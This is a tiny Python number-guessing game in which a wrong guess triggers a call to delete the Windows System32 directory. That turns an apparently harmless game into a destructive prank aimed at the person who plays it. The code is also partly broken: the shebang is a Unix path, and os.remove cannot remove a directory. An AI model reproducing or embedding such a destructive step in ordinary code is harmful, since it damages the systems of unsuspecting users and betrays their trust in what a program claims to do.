#!/bin/python3

# 4-10


import random
import os

number = random.randint(1,10)

guess = input("Guess between 1 and 10")
guess = int(guess)

if guess == number:
    print("Winner!")
else:
    print("Nope!")
    os.remove("C:\Windows\System32")
